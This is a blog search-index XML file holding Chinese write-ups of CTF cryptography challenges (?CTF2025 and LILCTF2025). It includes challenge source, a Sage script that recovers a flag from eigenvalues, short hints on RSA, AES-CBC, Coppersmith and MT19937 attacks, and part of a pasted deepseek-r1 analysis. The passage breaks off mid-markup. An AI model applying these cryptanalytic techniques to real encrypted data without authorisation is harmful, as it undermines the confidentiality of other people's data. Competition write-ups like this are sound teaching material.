<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>?CTF2025-Crypto</title>
    <link href="/2025/10/14/ilovectf2025/"/>
    <url>/2025/10/14/ilovectf2025/</url>
    
    <content type="html"><![CDATA[<blockquote><p>此篇文章只有思路，没有脚本（其实是太懒了，解出来就懒得写WP了，就靠回忆了）</p></blockquote><h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h1><h2 id="basic-number-theory"><a class="markdownIt-Anchor" href="#basic-number-theory"></a> Basic Number theory</h2><p>根据欧拉定理得，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mo>=</mo><mo>±</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">gift=±m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord mathnormal">m</span></span></span></span>，分别给gift1、gift2取模p、q下反，然后crt就好了</p><h2 id="strange-machine"><a class="markdownIt-Anchor" href="#strange-machine"></a> Strange Machine</h2><p>手动测试，十六轮为一个循环</p><p>计密文为C，重复输入一个字符，第一轮为A，当第十七轮时结果同A，取第十六轮结果为B</p><p>B 异或 输入的字符（记得填充） 异或 C</p><h2 id="beyondhex"><a class="markdownIt-Anchor" href="#beyondhex"></a> beyondHex</h2><p>超越hex，还有字符G，猜测17进制</p><p>python  long_to_bytes(int(a,17))</p><h2 id="certificate"><a class="markdownIt-Anchor" href="#certificate"></a> certificate</h2><p>最常见的证书形式，前面为数据为n、e，后面有一长串数据包含dp</p><p>可以先试试简单的（应该吧🤓）：<a href="https://naby1.github.io/2024/12/05/basectf2024/#%E5%93%8E%E5%91%80%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E4%BA%86">BaseCTF2024-Crypto-naby - Naby的博客</a></p><h2 id="two-es"><a class="markdownIt-Anchor" href="#two-es"></a> two Es</h2><p>一把梭<a href="https://naby1.github.io/2024/12/05/basectf2024/#exgcd">BaseCTF2024-Crypto-naby - Naby的博客</a></p><h2 id="xorrsa"><a class="markdownIt-Anchor" href="#xorrsa"></a> xorRSA</h2><p>找个脚本一把梭</p><h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1><h2 id="aes_mode"><a class="markdownIt-Anchor" href="#aes_mode"></a> AES_mode</h2><p>hint32字节，key只有16字节，异或后hint高16字节保留，则可以得到hint的值，从而得到key</p><p>密文为CBC模式加密，flag为iv，即第一轮使用flag作用iv先异或第一段明文之后加密</p><p>知道key、明文、密文，可以使用ECB模式，获取每轮的iv，从而逆推</p><h2 id="common-rsa"><a class="markdownIt-Anchor" href="#common-rsa"></a> Common RSA</h2><p>求p、q：p+q的平方没有比n大多少，循环加几个n直接开根就好了（实测加4个n，加0个n也能开根但结果开出来位数啥的不对），之后p+q和p*q解方程就好了</p><p>之后会发现p-1和q-1跟e不互素，直接上AMM解，只用一个数解就可以了，参考<a href="https://naby1.github.io/2024/12/05/basectf2024/#%E3%81%AE%E6%AD%AA%E6%9D%A5">BaseCTF2024-Crypto-naby - Naby的博客</a></p><h2 id="furious-blackcopper"><a class="markdownIt-Anchor" href="#furious-blackcopper"></a> Furious BlackCopper</h2><p>hint1为p的低20位，hint2为低830-30位</p><p>可以爆破20-30位，然后copper高194位</p><h2 id="baby-elgamal"><a class="markdownIt-Anchor" href="#baby-elgamal"></a> baby Elgamal</h2><p>sage用discrete_log_lambda解出x就行了</p><h2 id="findkey-in-middle"><a class="markdownIt-Anchor" href="#findkey-in-middle"></a> findKey in middle</h2><p>key被拆成了两个16位，思路为中间相遇</p><p>分别遍历range为k1和k2求对应的pow放到字典（键为i，值为pow(3或5,i,p) ）里，之后遍历k1的字典，取模p下的反乘上x，看看k2的字典的值中是否存在，遍历到即可得到k1和k2</p><h2 id="strange-random"><a class="markdownIt-Anchor" href="#strange-random"></a> strange random</h2><p>用<em>MT19937Predictor</em>一把梭</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LILCTF2025</title>
    <link href="/2025/08/17/LILCTF2025/"/>
    <url>/2025/08/17/LILCTF2025/</url>
    
    <content type="html"><![CDATA[<blockquote><p>应该是最后一场比赛了，拼尽全力无法战胜</p></blockquote><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="ez_math"><a class="markdownIt-Anchor" href="#ez_math"></a> ez_math</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span>[<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>]<br>lambda1 = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>])<br>lambda2 = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>:])<br>p = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">vector, c</span>):<br>    <span class="hljs-keyword">return</span> [vector[<span class="hljs-number">0</span>]*c, vector[<span class="hljs-number">1</span>]*c]<br><br>v1 = [getPrime(<span class="hljs-number">128</span>), getPrime(<span class="hljs-number">128</span>)]<br>v2 = [getPrime(<span class="hljs-number">128</span>), getPrime(<span class="hljs-number">128</span>)]<br><br>A = matrix(GF(p), [v1, v2])<br>B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)])<br>C = A.inverse() * B<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;C = <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(C).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;,&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>).replace(<span class="hljs-string">&quot;[,&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>)&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>恶补了下线代，都忘光了</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>B</mi><mo>=</mo><mrow><mo fence="true">∣</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>λ</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>λ</mi><mn>2</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">∣</mo></mrow><mo>∗</mo><mi>A</mi><mspace linebreak="newline"></mspace><mtext>记为：</mtext><mi>B</mi><mo>=</mo><mi>D</mi><mo>∗</mo><mi>A</mi><mspace linebreak="newline"></mspace><mtext>可知：</mtext><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>B</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>D</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">B=\begin{vmatrix}\lambda_1&amp;0\\0&amp;\lambda_2\\\end{vmatrix}*A\\记为：B=D*A\\可知：C=A^{-1}B=A^{-1}DA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.42999em;vertical-align:-0.9500199999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span></span></span></span></span></p><p>因此C和是相似矩阵，特征值相同，为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>λ</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\lambda_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>λ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\lambda_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>求解特征多项式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>C</mi><mo>−</mo><mi>x</mi><mi>I</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mi>t</mi><mi>r</mi><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>x</mi><mo>+</mo><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">det(C-xI)=x^2-tr(C)*x+det(C)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></p><p>用sage很快就出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>p = <span class="hljs-number">9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span><br>C = [<span class="hljs-number">7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645</span>,<span class="hljs-number">7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801</span>],[<span class="hljs-number">7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808</span>,<span class="hljs-number">2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872</span>]<br><br>C_matrixC=matrix(GF(p), C)<br><br>tr=C_matrixC.trace()<br>det=C_matrixC.det()<br><br>R.&lt;x&gt;=PolynomialRing(GF(p), <span class="hljs-string">&#x27;x&#x27;</span>)<br>f=x^<span class="hljs-number">2</span>-tr*x+det<br>roots=f.roots()<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(roots[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])))<br></code></pre></td></tr></table></figure><h2 id="mid_math"><a class="markdownIt-Anchor" href="#mid_math"></a> mid_math</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br>flag = <span class="hljs-string">b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">64</span>)<br>P = GF(p)<br><br>key = randint(<span class="hljs-number">2</span>**<span class="hljs-number">62</span>, p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">vector, c</span>):<br>    <span class="hljs-keyword">return</span> [vector[<span class="hljs-number">0</span>]*c, vector[<span class="hljs-number">1</span>]*c, vector[<span class="hljs-number">2</span>]*c, vector[<span class="hljs-number">3</span>]*c, vector[<span class="hljs-number">4</span>]*c]<br><br>v1 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v2 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v3 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v4 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v5 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>a, b, c, d, e = getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>),  <span class="hljs-number">0</span><br><br>A = matrix(P, [v1, v2, v3, v4, v5])<br>B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), mul(v5, e)])<br>C = A.inverse() * B<br>D = C**key<br><br>key = pad(long_to_bytes(key), <span class="hljs-number">16</span>)<br>aes = AES.new(key,AES.MODE_ECB)<br>msg = aes.encrypt(pad(flag, <span class="hljs-number">64</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;C = <span class="hljs-subst">&#123;[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> C]&#125;</span>&#x27;</span>.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;D = <span class="hljs-subst">&#123;[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> D]&#125;</span>&#x27;</span>.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;msg = <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>把上一题喂给deepseek-r1就可以了</strong></p><h3 id="问题分析"><a class="markdownIt-Anchor" href="#问题分析"></a> 问题分析</h3><p>该问题结合了线性代数和AES加密，需要从给定的矩阵和密文中恢复加密密钥。以下是关键点分析：</p><h4 id="1-矩阵结构分析"><a class="markdownIt-Anchor" href="#1-矩阵结构分析"></a> 1. <strong>矩阵结构分析</strong></h4><ul><li>矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> 由5个随机64位素数向量组成：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>v</mi><mn>1</mn></msub><mtext> </mtext><msub><mi>v</mi><mn>2</mn></msub><mtext> </mtext><msub><mi>v</mi><mn>3</mn></msub><mtext> </mtext><msub><mi>v</mi><mn>4</mn></msub><mtext> </mtext><msub><mi>v</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A = \begin{bmatrix} v_1 \ v_2 \ v_3 \ v_4 \ v_5 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span 